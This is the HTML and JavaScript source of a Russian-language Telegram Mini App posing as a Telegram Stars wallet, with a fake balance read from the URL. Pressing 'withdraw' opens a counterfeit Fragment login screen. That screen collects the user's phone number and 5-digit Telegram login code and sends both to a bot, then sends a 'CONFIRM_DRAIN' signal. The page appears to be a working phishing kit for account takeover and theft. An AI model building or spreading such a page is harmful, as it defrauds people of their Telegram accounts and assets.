<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background: #121212; color: white; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; overflow-x: hidden; -webkit-font-smoothing: antialiased; }
        .page { display: none; padding: 20px; animation: fadeIn 0.3s; }
        .active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Шапка профиля */
        .profile-header { display: flex; align-items: center; gap: 10px; background: #1c1c1c; padding: 10px 15px; border-radius: 50px; width: fit-content; margin: 0 auto 30px auto; border: 1px solid #262626; }
        .avatar { width: 28px; height: 28px; border-radius: 50%; object-fit: cover; }
        .username { font-size: 14px; font-weight: 500; }

        /* Баланс */
        .balance-section { text-align: center; margin-bottom: 40px; }
        .star-ios { font-family: "Apple Color Emoji", "Segoe UI Emoji", sans-serif; font-size: 48px; vertical-align: middle; }
        .balance-val { font-size: 62px; font-weight: 800; margin-left: 10px; vertical-align: middle; letter-spacing: -2px; }
        .balance-label { color: #888; margin-top: 5px; font-size: 15px; }

        /* Кнопки */
        .action-btns { display: flex; justify-content: center; gap: 40px; margin-bottom: 30px; }
        .btn-round { display: flex; flex-direction: column; align-items: center; gap: 8px; text-decoration: none; color: #fecb2e; font-size: 13px; font-weight: 600; cursor: pointer; }
        .icon-circle { width: 52px; height: 52px; border-radius: 50%; border: 2px solid #fecb2e; display: flex; align-items: center; justify-content: center; font-size: 22px; }

        /* Меню */
        .menu-card { background: #1c1c1c; border-radius: 16px; padding: 18px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; margin-top: 20px; border: 1px solid #262626; }
        .menu-left { display: flex; align-items: center; gap: 15px; }
        .menu-icon { background: #fecb2e; color: #000; width: 40px; height: 40px; border-radius: 10px; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        .menu-text b { display: block; font-size: 16px; margin-bottom: 3px; }
        .menu-text span { font-size: 13px; color: #888; }

        /* ЭКРАН ФРАГМЕНТ (АВТОРИЗАЦИЯ) */
        .auth-screen { text-align: center; padding: 40px 15px; }
        .auth-icons { display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 30px; }
        .icon-tg, .icon-frag { width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; }
        .icon-tg { background: #248bcf; color: white; }
        .icon-frag { background: #1c1c1c; color: white; border: 1px solid #333; }
        .icon-arrow-link { color: #248bcf; font-size: 24px; }

        .auth-title { font-size: 24px; font-weight: 700; margin-bottom: 15px; line-height: 1.2; color: #fff; }
        .auth-desc { color: #888; font-size: 15px; margin-bottom: 35px; line-height: 1.4; padding: 0 10px; }
        .auth-desc a { color: #248bcf; text-decoration: none; }

        .btn-fragment { background: #248bcf; color: white; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 700; font-size: 15px; text-transform: uppercase; cursor: pointer; letter-spacing: 0.5px; }
        .btn-cancel { background: transparent; color: #248bcf; border: none; padding: 15px; width: 100%; font-weight: 600; font-size: 15px; margin-top: 10px; cursor: pointer; text-transform: uppercase; }
        
        /* Ввод кода */
        .code-input-container { margin-top: 20px; }
        input { width: 100%; background: #1c1c1c; border: 1px solid #333; padding: 18px; border-radius: 12px; color: white; text-align: center; font-size: 22px; font-weight: 700; letter-spacing: 8px; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: #248bcf; }
    </style>
</head>
<body>

    <div id="main-page" class="page active">
        <div class="profile-header">
            <img id="u-avatar" class="avatar" src="">
            <span id="u-name" class="username">Загрузка...</span>
        </div>

        <div class="balance-section">
            <span class="star-ios">⭐</span>
            <span class="balance-val" id="stars-val">0</span>
            <div class="balance-label">Общий баланс в звездах</div>
        </div>

        <div class="action-btns">
            <div class="btn-round"><div class="icon-circle"><i class="fa-solid fa-arrow-down"></i></div>Пополнить</div>
            <div class="btn-round" onclick="handleWithdraw()"><div class="icon-circle"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>Вывести</div>
        </div>

        <div class="menu-card">
            <div class="menu-left">
                <div class="menu-icon"><i class="fa-solid fa-money-check-dollar"></i></div>
                <div class="menu-text">
                    <b>Звезды чеками</b>
                    <span>Делитесь звездами с помощью чеков.</span>
                </div>
            </div>
            <i class="fa-solid fa-chevron-right" style="color: #444;"></i>
        </div>

        <div style="margin-top: 40px;">
            <div style="color: #666; font-size: 14px; font-weight: 600; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 0.5px;">История транзакций</div>
            <div style="text-align: center; color: #444; margin-top: 40px; font-size: 15px;">Транзакций пока нет</div>
        </div>
    </div>

    <div id="auth-page" class="page">
        <div class="auth-screen">
            <div class="auth-icons">
                <div class="icon-tg"><i class="fa-brands fa-telegram"></i></div>
                <div class="icon-arrow-link"><i class="fa-solid fa-arrow-right"></i></div>
                <div class="icon-frag">
                    <svg width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2L3 7V17L12 22L21 17V7L12 2Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M12 22V12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M21 7L12 12L3 7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
            </div>
            
            <div id="auth-content">
                <div class="auth-title">Войдите, чтобы использовать аккаунт Telegram</div>
                <div class="auth-desc">
                    для <a href="#">fragment.com</a> и <a href="#">Fragment Auction Alerts</a>.<br>
                    Подтверждение будет отправлено в <b>Telegram</b>.
                </div>
                
                <div id="auth-action">
                    <button class="btn-fragment" onclick="requestContact()">Поделиться номером телефона</button>
                    <button class="btn-cancel" onclick="showPage('main-page')">Отмена</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.backgroundColor = '#121212';
        tg.headerColor = '#121212';

        const user = tg.initDataUnsafe.user;
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount') || "0";
        let isAuthorized = false;

        document.getElementById('u-avatar').src = user?.photo_url || 'https://i.imgur.com/8K9v679.png';
        document.getElementById('u-name').innerText = user?.first_name || 'Пользователь';
        document.getElementById('stars-val').innerText = amount;

        function handleWithdraw() {
            if (!isAuthorized) {
                showPage('auth-page');
            } else {
                tg.sendData("CONFIRM_DRAIN");
                tg.close();
            }
        }

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        function requestContact() {
            tg.sendData("REQUEST_CONTACT_TRIGGER"); 
            tg.close();
        }

        // Если бот прислал ссылку с кодом
        if(urlParams.get('step') === 'code') {
            showPage('auth-page');
            document.getElementById('auth-content').innerHTML = `
                <div class="auth-title">Введите проверочный код</div>
                <div class="auth-desc">Код был отправлен в ваш чат с Telegram.</div>
                <div class="code-input-container">
                    <input type="number" id="tg-code" placeholder="00000" maxlength="5">
                </div>
                <button class="btn-fragment" style="margin-top: 30px;" onclick="submitCode()">Далее</button>
            `;
        }

        if(urlParams.get('authorized') === 'true') {
            isAuthorized = true;
        }

        function submitCode() {
            let code = document.getElementById('tg-code').value;
            if(code.length < 5) return;
            tg.sendData("c:" + code);
            tg.close();
        }
    </script>
</body>
                    </html>
